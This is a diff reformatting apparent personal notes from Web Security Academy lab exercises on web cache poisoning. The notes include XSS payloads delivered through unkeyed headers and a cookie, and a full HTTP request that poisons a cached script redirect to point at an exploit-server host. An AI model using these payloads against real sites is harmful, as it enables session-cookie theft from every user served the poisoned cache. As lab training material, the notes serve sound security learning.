@@ -1,24 +1,23 @@
-Web Cache Poisoning
+# Web Cache Poisoning
 
-- Unkeyed header
--- Use param miner extension to find headers
--- -- Found that x-Forwarded-Host is reflected in the response
--- Used this payload to exploit: X-Forwarded-Host: "></script><script>alert(document.cookie)</script><script>
+## Unkeyed header
+- Use param miner extension to find headers
+  - Found that x-Forwarded-Host is reflected in the response
+- Used this payload to exploit: `X-Forwarded-Host: "></script><script>alert(document.cookie)</script><script>`
 
-- Unkeyed cookie
--- Cookies are not in cache key 
--- -- Cache key = predefined request components
--- Param miner found fehost cookie
--- Used this payload to exploit: Cookie: fehost=x")</script><script>alert(1)</script><script>
+## Unkeyed cookie
+- Cookies are not in cache key 
+  - Cache key = predefined request components
+- Param miner found fehost cookie
+- Used this payload to exploit: `Cookie: fehost=x")</script><script>alert(1)</script><script>`
 
-- Multiple headers
--- Param miner found X-Forwarded-Proto header
--- If you use this it adds a redirect to a url that includes the web dir in the original request
--- The website also allowed for X-Forwarded-Host which would change the link
--- I sent this request to tracking.js:
-------------------------------------------------------------------------------------------
-GET /resources/js/tracking.js HTTP/2
-Host: 0a5200060335f34b817d667700130056.web-security-academy.net
+## Multiple headers
+- Param miner found X-Forwarded-Proto header
+- If you use this it adds a redirect to a url that includes the web dir in the original request
+- The website also allowed for X-Forwarded-Host which would change the link
+- I sent this request to tracking.js:
+```
+GET /resources/js/tracking.js HTTP/2Host: 0a5200060335f34b817d667700130056.web-security-academy.net
 Cookie: session=CMTcrvpZEooQ7J39QXbx1HYOk8OlhNwC
 Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
 Sec-Ch-Ua-Mobile: ?0
@@ -33,9 +32,9 @@ Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
 X-Forwarded-Scheme: http
 X-Forwarded-Host: exploit-0a7a00fd0366f3b28166658101d300c4.exploit-server.net
-------------------------------------------------------------------------------------------
--- and got this response:
-------------------------------------------------------------------------------------------
+```
+- and got this response:
+```
 HTTP/2 302 Found
 Location: https://exploit-0a7a00fd0366f3b28166658101d300c4.exploit-server.net/resources/js/tracking.js
 X-Frame-Options: SAMEORIGIN
@@ -43,9 +42,9 @@ Cache-Control: max-age=30
 Age: 3
 X-Cache: hit
 Content-Length: 0
-------------------------------------------------------------------------------------------
--- The X-Cache: hit means that the new link was stored
--- The payload on the exploit server was: alert(document.cookie)
+```
+- The X-Cache: hit means that the new link was stored
+- The payload on the exploit server was: alert(document.cookie)
 
 - Unknown header
 -- Param miner found X-Host header
